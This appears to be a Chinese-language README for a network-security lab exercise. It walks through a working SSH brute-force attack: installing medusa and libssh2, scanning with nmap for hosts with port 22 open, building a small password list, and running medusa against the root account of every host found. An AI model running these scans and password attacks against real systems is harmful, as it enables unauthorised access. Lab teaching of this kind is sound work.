# network-security
网络攻防实验项目操作步骤：
* 1、下载medusa和libssh
```bash
 wget http://www.foofus.net/jmk/tools/medusa-2.0.tar.gz
 wget http://www.libssh2.org/download/libssh2-1.2.6.tar.gz
```
* 2、安装medusa和libssh
```bash
tar -zxvf libssh2-1.2.6.tar.gz -C /usr/src/  
cd /usr/src/libssh2-1.2.6/
./configure ; make ; make install
```
```bash
apt install medusa
//查看medusa是否安装成功 medusa
```
* 3、安装nmap
```bash
apt install nmap
//查看nmap安装成功否：nmap -v
```
* 4、分析我们需要的主机IP
```bash
nmap -sV -p22 -oG ssh 192.168.147.129
```
扫描此IP整个段开了22端口的机器，并且判断服务版本，保存到ssh文件中。
* 5、查看IP
```bash
cat ssh
```
* 6、将上面信息的IP提取出来进行整理到ssh1.txt
```bash
grep 22/open ssh |awk '{print $2}' >>ssh1.txt
```
* 7、查看获取到的IP
```bash
cat ssh1.txt
```
* 8、自己手动创建一个密码字典（可以自己去网上找更加好的字典。）以脚本的方式运行
```bash
vim mkpasswd.sh
```
```bash
#!/bin/bash
#
#测试字典
#
touch passwd.txt
echo $RANDOM >>passwd.txt   --$RANDOM 产生随机数重定向到passwd.txt
echo $RANDOM >>passwd.txt
echo $RANDOM >>passwd.txt
echo $RANDOM >>passwd.txt
echo $RANDOM >>passwd.txt
echo 123456 >>passwd.txt    --此处是我自己的真实密码，实验环境*0*。
echo $RANDOM >>passwd.txt
echo $RANDOM >>passwd.txt
echo $RANDOM >>passwd.txt
echo $RANDOM >>passwd.txt
echo $RANDOM >>passwd.txt
```
* 9、赋予mkpasswd.sh执行权限并执行
```bash
chmod +x mkpasswd.sh
./mkpasswd.sh 
```
* 10、自动生成我的测试字典 passwd.txt
```bash
cat passwd.txt
```
* 11、破解密码
```bash
medusa -H ssh1.txt -u root -P passwd.txt -M ssh
````
